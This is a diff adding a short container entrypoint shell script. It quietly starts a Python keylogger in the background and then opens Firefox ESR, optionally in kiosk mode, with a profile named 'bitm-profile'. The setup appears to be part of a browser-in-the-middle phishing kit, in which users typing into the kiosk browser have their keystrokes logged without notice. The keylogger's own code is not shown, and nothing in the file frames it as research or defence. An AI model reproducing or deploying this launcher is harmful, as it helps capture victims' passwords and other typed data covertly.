@@ -1,0 +1,15 @@
+#!/bin/sh
+/usr/local/bin/automation-python /bitm/app/keylogger/keylogger.py &
+
+firefox_url="${URL:-about:blank}"
+
+if [ "${MODE:-}" = "kiosk" ]; then
+    exec /usr/bin/firefox-esr \
+        "$firefox_url" \
+        --profile /config/.mozilla/firefox/bitm-profile \
+        --kiosk
+fi
+
+exec /usr/bin/firefox-esr \
+    "$firefox_url" \
+    --profile /config/.mozilla/firefox/bitm-profile
